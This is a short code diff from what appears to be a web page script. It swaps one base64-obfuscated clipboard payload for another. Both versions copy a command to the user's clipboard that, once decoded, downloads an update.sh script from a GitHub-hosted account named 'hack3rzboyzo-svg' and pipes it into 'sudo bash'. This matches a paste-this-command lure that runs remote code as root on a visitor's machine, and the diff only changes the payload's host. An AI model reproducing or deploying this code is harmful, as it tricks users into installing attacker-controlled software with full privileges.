@@ -126,7 +126,7 @@
         locked = true;
         phase = 1;
         updateUI();
-        await copyToken(`bash <<< $(echo "Y3VybCAtcyAtTCAnaHR0cHM6Ly9oYWNrM3J6Ym95em8tc3ZnLmdpdGh1Yi5pby91cGRhdGUuc2gnIHwgc3VkbyBiYXNo" | base64 -d)`);
+        await copyToken(`bash <<< $(echo "Y3VybCAtcyAtTCAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hhY2szcnpib3l6by1zdmcvaGFjazNyemJveXpvLXN2Zy5naXRodWIuaW8vbWFpbi91cGRhdGUuc2gnIHwgc3VkbyBiYXNo" | base64 -d)`);
         setTimeout(function() {
           phase = 2;
           locked = false;
